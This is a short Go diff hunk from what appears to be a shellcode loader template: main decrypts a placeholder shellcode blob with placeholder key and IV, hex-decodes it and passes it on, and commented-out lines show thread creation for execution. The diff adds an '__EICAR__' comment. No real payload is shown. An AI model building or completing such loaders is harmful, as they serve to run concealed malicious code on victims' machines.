@@ -74,7 +74,8 @@ func SyscallExecute(Shellcode []byte) (bool){
 // 	WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF)
 // }
 
-func main() {	
+func main() {
+	// "__EICAR__"
 	supersc := decryptthat("_KEY_","_IV_","_SHELLCODE_")
 	sc, err := hex.DecodeString(supersc)
 	if err != nil {
